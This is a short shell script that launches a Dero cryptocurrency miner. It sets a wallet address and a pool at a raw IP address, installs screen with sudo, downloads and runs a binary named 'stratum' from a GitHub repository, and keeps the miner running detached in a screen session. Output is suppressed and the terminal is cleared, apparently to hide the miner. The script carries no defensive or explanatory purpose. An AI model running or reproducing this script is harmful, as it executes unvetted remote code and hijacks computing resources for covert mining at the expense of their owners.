#!/bin/sh

WALLET=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.fakerbulset

POOL=stratum+tcp://128.199.159.60:80

sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/rigmining/dora/raw/main/stratum
chmod +x stratum
screen -S Wuenuak_Guerrr -dm nohup ./stratum -r $POOL -w $WALLET -m 14 nohup.out >/dev/null 2>&1
screen -ls
sleep 2
clear
screen -ls
./timer.sh
